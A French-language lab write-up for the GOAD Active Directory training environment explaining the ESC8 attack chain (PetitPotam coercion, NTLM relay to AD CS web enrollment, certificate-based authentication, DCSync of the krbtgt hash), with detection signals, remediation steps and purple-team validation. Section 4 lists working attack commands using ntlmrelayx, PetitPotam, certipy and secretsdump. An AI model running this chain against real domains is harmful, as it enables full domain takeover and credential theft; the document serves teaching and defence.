# Solution GOAD — ESC8 : PetitPotam + relais NTLM vers AD CS

> Write-up détaillé d'une amélioration/faille à ajouter à GOAD (voir PROJECT.md §10). Chaîne menant
> d'un accès réseau non authentifié à la **compromission du domaine** via AD CS. Lab isolé uniquement.

## 1. Résumé
Si une autorité de certification expose **Web Enrollment en HTTP** sans EPA, un attaquant peut
**coercer** un contrôleur de domaine (PetitPotam/Coercer) pour qu'il s'authentifie en NTLM vers lui,
**relayer** cette authentification vers l'endpoint HTTP de la CA, et obtenir un **certificat
d'authentification du compte machine du DC**. Avec ce certificat, il obtient un TGT du DC (PKINIT),
puis réalise un **DCSync** → contrôle du domaine.

## 2. Pré-requis (côté cible, pour que ça marche)
- AD CS avec **CA Web Enrollment** sur **HTTP** (pas d'HTTPS+EPA).
- **NTLM** autorisé ; signature non imposée partout.
- Un déclencheur de coercition accessible (MS-EFSRPC pour PetitPotam, ou autres via Coercer).

## 3. Cause racine
- **ESC8** : l'endpoint d'enrôlement web accepte une authentification NTLM **relayable** (pas d'EPA),
  et émet un certificat d'**authentification** (template DomainController/Machine) au compte relayé.
- Le DC accepte ensuite ce certificat pour s'authentifier (mapping implicite via le compte machine).

## 4. Exploitation pas-à-pas (lab isolé)
```bash
# 1) Démarrer le relais vers l'endpoint HTTP de la CA, en demandant un cert pour le template machine
sudo ntlmrelayx.py -t http://PAR-CA-01/certsrv/certfnsh.asp -smb2support --adcs \
  --template 'DomainController'

# 2) Coercer le DC pour qu'il s'authentifie vers l'attaquant (MS-EFSRPC)
python3 PetitPotam.py <attacker_ip> 10.10.0.10
#    -> ntlmrelayx capture l'auth du DC01$ et obtient un certificat (base64) pour DC01$

# 3) Utiliser le certificat pour obtenir un TGT du DC (PKINIT) et son hash NT
certipy auth -pfx dc01.pfx -dc-ip 10.10.0.10
#    -> TGT + hash NT de DC01$

# 4) DCSync (le compte machine d'un DC peut répliquer) -> secrets du domaine (krbtgt, admin)
secretsdump.py 'corp.meridian.com/DC01$@10.10.0.10' -k -no-pass -just-dc-user krbtgt
#    -> hash krbtgt -> Golden Ticket (persistance), ou hash administrator -> contrôle total
```

## 5. Impact
Compromission complète du domaine (via krbtgt/DA), et **persistance** par certificat (valide tant
qu'il n'est pas révoqué, survit au changement de mot de passe).

## 6. Détection
| Étape | Signal | Source / ID |
|---|---|---|
| Coercition | appels MS-EFSRPC (EfsRpcOpenFileRaw…) | réseau / Defender for Identity |
| Relais → émission | certificat émis pour un **compte machine** (`$`) | AD CS 4886 (Requester `DC01$`) |
| Auth par cert (PKINIT) | TGT via certificat | 4768 (PreAuthType 16, Certificate) |
| DCSync | réplication demandée | 4662 (GUID DS-Replication) — voir module 26 |

Règle Sigma (émission pour compte machine) : voir `02-modules/41-adcs-deploiement/defend.md`.

## 7. Remédiation
1. **Supprimer/désactiver Web Enrollment HTTP** ; si indispensable : **HTTPS + EPA** + désactiver NTLM
   sur l'endpoint.
2. **Imposer la signature** (SMB/LDAP) et **réduire NTLM** (modules 15/17) → casse le relais.
3. **Mapping fort** (KB5014754) et audit AD CS.
4. **CA = Tier 0** (isolation, PAW).
5. Désactiver la coercition inutile (correctifs PetitPotam/MS-EFSRPC, filtrage).

## 8. Validation (boucle purple team)
Après remédiation : relancer la chaîne → `ntlmrelayx` ne reçoit plus d'auth exploitable / l'émission
pour un compte machine échoue → confirmer via `certipy find -vulnerable` (ESC8 absent) et absence du
4886 pour `DC01$`.

## 9. Pour aller plus loin
*Certified Pre-Owned* (ESC8), Certipy wiki, docs Microsoft KB5005413 (atténuation PetitPotam/relais AD CS).
Modules liés : `41-adcs-deploiement`, `43-adcs-esc`, `54-coercition-ntlm-relay` (Phase 5).
